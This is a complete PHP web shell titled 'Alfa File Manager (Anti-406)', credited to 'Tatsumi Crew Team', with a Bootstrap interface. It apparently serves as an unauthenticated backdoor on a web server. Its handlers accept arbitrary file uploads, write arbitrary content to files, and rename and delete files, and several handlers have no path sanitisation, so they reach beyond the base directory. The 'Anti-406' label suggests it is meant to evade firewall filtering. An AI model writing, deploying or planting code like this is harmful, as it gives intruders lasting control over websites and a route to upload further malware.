
<?php
// ============================================================================
//  Author: Tatsumi Crew Team (Modified for Anti-406)
//  Don't Delete Author !!!!!
// ============================================================================

session_start();

define('AES_KEY', hex2bin('0123456789abcdef0123456789abcdef0123456789abcdef0123456789abcdef'));

// Encrypt & Decrypt functions
function aes_encrypt($plaintext)
{
    $iv     = openssl_random_pseudo_bytes(16);
    $cipher = openssl_encrypt($plaintext, 'AES-256-CBC', AES_KEY, OPENSSL_RAW_DATA, $iv);
    return base64_encode($iv . $cipher);
}

function aes_decrypt($ciphertext_base64)
{
    $data   = base64_decode($ciphertext_base64);
    $iv     = substr($data, 0, 16);
    $cipher = substr($data, 16);
    return openssl_decrypt($cipher, 'AES-256-CBC', AES_KEY, OPENSSL_RAW_DATA, $iv);
}

// Set base directory
$base_dir = __DIR__;
if (!isset($_SESSION['current_dir'])) {
    $_SESSION['current_dir'] = $base_dir;
}

// Change directory if requested
if (isset($_POST['change_dir'])) {
    $attempt = realpath($_SESSION['current_dir'] . '/' . $_POST['change_dir']);
    if ($attempt && strpos($attempt, $base_dir) === 0 && is_dir($attempt)) {
        $_SESSION['current_dir'] = $attempt;
    }
}

// Reset to base directory
if (isset($_POST['reset_dir'])) {
    $_SESSION['current_dir'] = $base_dir;
}

$dir = $_SESSION['current_dir'];

// ===== Handle POST Requests =====
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    if (isset($_POST['delete'])) {
        $target = realpath($dir . '/' . $_POST['delete']);
        if ($target && strpos($target, $base_dir) === 0) {
            if (is_file($target)) {
                unlink($target);
            } elseif (is_dir($target)) {
                array_map('unlink', glob("$target/*.*"));
                rmdir($target);
            }
        }
    }

    if (isset($_POST['newfile'])) {
        file_put_contents($dir . '/' . basename($_POST['newfile']), '');
    }

    if (isset($_POST['newfolder'])) {
        mkdir($dir . '/' . basename($_POST['newfolder']));
    }

    if (isset($_POST['rename'], $_POST['to'])) {
        rename($dir . '/' . $_POST['rename'], $dir . '/' . $_POST['to']);
    }

    if (isset($_FILES['upload'])) {
        move_uploaded_file($_FILES['upload']['tmp_name'], $dir . '/' . $_FILES['upload']['name']);
    }

    if (isset($_POST['save'], $_POST['content'])) {
        file_put_contents($dir . '/' . $_POST['save'], $_POST['content']);
    }
}

// ===== Helper Functions =====
function human_filesize($bytes, $decimals = 2)
{
    $size   = ['B', 'KB', 'MB', 'GB', 'TB'];
    $factor = floor((strlen($bytes) - 1) / 3);
    return sprintf("%.{$decimals}f", $bytes / pow(1024, $factor)) . ' ' . $size[$factor];
}

function human_perms($file)
{
    if (!file_exists($file) || !is_readable($file)) return '---------';
    $perms = @fileperms($file);
    if ($perms === false) return '---------';

    $owner = (($perms & 0x0100) ? 'r' : '-') . (($perms & 0x0080) ? 'w' : '-') . (($perms & 0x0040) ? 'x' : '-');
    $group = (($perms & 0x0020) ? 'r' : '-') . (($perms & 0x0010) ? 'w' : '-') . (($perms & 0x0008) ? 'x' : '-');
    $other = (($perms & 0x0004) ? 'r' : '-') . (($perms & 0x0002) ? 'w' : '-') . (($perms & 0x0001) ? 'x' : '-');

    return $owner . $group . $other;
}

$entries = array_diff(scandir($dir), ['.', '..']);
$dirs    = [];
$files   = [];

foreach ($entries as $entry) {
    $path = $dir . DIRECTORY_SEPARATOR . $entry;
    if (is_dir($path)) {
        $dirs[] = $entry;
    } else {
        $files[] = $entry;
    }
}

sort($dirs, SORT_NATURAL | SORT_FLAG_CASE);
sort($files, SORT_NATURAL | SORT_FLAG_CASE);
$sortedItems = array_merge($dirs, $files);
?>

<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<title>🌟 Alfa File Manager Anti-406</title>
<link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/css/bootstrap.min.css" rel="stylesheet">
</head>
<body class="container py-4">
    <h1 class="mb-4">🌟 Alfa File Manager (Anti-406)</h1>

    <!-- Navigation -->
    <form method="POST" class="mb-3 d-flex gap-2">
        <button name="reset_dir" class="btn btn-secondary">🏠 Base Directory</button>
    </form>

    <!-- Create New File/Folder -->
    <form method="POST" class="mb-3 d-flex gap-2">
        <input type="text" name="newfile" placeholder="New file name" class="form-control" required>
        <button class="btn btn-primary">📄 Create File</button>
    </form>
    <form method="POST" class="mb-3 d-flex gap-2">
        <input type="text" name="newfolder" placeholder="New folder name" class="form-control" required>
        <button class="btn btn-primary">📁 Create Folder</button>
    </form>

    <!-- Upload File -->
    <form method="POST" enctype="multipart/form-data" class="mb-3">
        <div class="input-group">
            <input type="file" name="upload" class="form-control" required>
            <button class="btn btn-success">⬆️ Upload</button>
        </div>
    </form>

    <!-- Directory Listing -->
    <ul class="list-group">
        <?php foreach ($dirs as $folder): ?>
            <li class="list-group-item d-flex justify-content-between align-items-center">
                📁 <?= htmlspecialchars($folder) ?>
                <form method="POST" class="d-inline">
                    <button name="change_dir" value="<?= htmlspecialchars($folder) ?>" class="btn btn-sm btn-primary">Open</button>
                </form>
            </li>
        <?php endforeach; ?>
        <?php foreach ($files as $file): ?>
            <li class="list-group-item d-flex justify-content-between align-items-center">
                📄 <?= htmlspecialchars($file) ?>
                <div class="btn-group">
                    <form method="POST" class="d-inline">
                        <input type="hidden" name="delete" value="<?= htmlspecialchars($file) ?>">
                        <button onclick="return confirm('Delete <?= addslashes($file) ?>?')" class="btn btn-sm btn-danger">🗑️ Delete</button>
                    </form>
                </div>
            </li>
        <?php endforeach; ?>
    </ul>
</body>
</html>
